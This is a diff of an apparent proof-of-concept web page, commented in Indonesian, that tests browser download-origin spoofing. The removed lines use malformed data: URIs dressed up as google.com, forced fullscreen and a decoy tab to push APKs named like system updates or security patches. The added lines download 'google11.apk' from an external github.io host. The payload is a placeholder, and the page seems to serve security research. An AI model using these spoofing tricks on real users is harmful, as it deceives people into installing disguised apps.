@@ -1,69 +1,25 @@
-<!DOCTYPE html> 
-<html lang="en"> 
-<head> 
-    <meta charset="UTF-8"> 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download & Fullscreen Test - Variant</title> 
-    <style>
-        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 50px; }
-        #triggerInput { padding: 10px; font-size: 16px; width: 80%; max-width: 300px; text-align: center; }
-        .btn-group { margin-top: 20px; }
-        button { padding: 10px 20px; margin: 5px; cursor: pointer; }
-    </style>
-</head> 
-<body> 
-
-    <h2>POC Download Spoofing Lab</h2> 
-    <input type="text" id="triggerInput" placeholder="Ketuk di sini untuk test...">
-
-    <div class="btn-group">
-        <p>Atau uji langsung variasi skema unduhan di bawah:</p>
-        <button onclick="openVariant('at_sign')">Varian 1 (@ Spoof)</button>
-        <button onclick="openVariant('slash_com')">Varian 2 (Double Slash)</button>
-    </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Download Spoofing Test</title>
+</head>
+<body>
+    <h2>POC by Chigorin!</h2>
+    <button onclick="picuUnduhan()">Unduh APK</button>
 
     <script>
-        // Trigger utama dari input (Menggunakan Fullscreen + Tab Baru + Download)
-        document.getElementById('triggerInput').addEventListener('click', function() {
-            goFullScreen();
-            window.open('https://www.google.com', '_blank');
+        function picuUnduhan() {
+            const link = document.createElement("a");
             
-            setTimeout(function() {
-                // Default fallback dari kode Anda (menggunakan file APK)
-                Puf("data://google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=", "google11.apk");
-            }, 500);
-        }, { once: false });
-
-        // Fungsi pembantu unduhan
-        function Puf(uri, name) { 
-            const link = document.createElement("a"); 
-            link.href = uri; 
-            link.download = name; 
-            document.body.appendChild(link); 
-            link.click(); 
-            document.body.removeChild(link); 
+            // Mengarahkan langsung ke file di server internet agar domainnya muncul di UI
+            link.href = "https://0x403for.github.io/chigorin/google11.apk"; 
+            link.download = "google11.apk";
+            
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
         }
-
-        // Variasi skema URL alternatif untuk menguji celah parser baru
-        function openVariant(type) {
-            if (type === 'at_sign') {
-                // Menguji apakah parser keliru membaca karakter '@' sebagai kredensial basic-auth
-                // Format: data:[domain_palsu]@[domain_asli]
-                Puf("data:google.com@application/vnd.android.package-archive;base64,ZXN0dGVzdGVzdHRlc3Q=", "update_system.apk");
-            } 
-            else if (type === 'slash_com') {
-                // Menguji apakah parser UI membaca string setelah data:asdf/ sebagai host
-                Puf("data:application/vnd.android.package-archive://google.com;base64,ZXN0dGVzdGVzdHRlc3Q=", "security_patch.apk");
-            }
-        }
-
-        // Fungsi Fullscreen
-        function goFullScreen() { 
-            const element = document.documentElement; 
-            if (element.requestFullscreen) { element.requestFullscreen(); } 
-            else if (element.webkitRequestFullscreen) { element.webkitRequestFullscreen(); } 
-        } 
-    </script> 
-</body> 
+    </script>
+</body>
 </html>
-
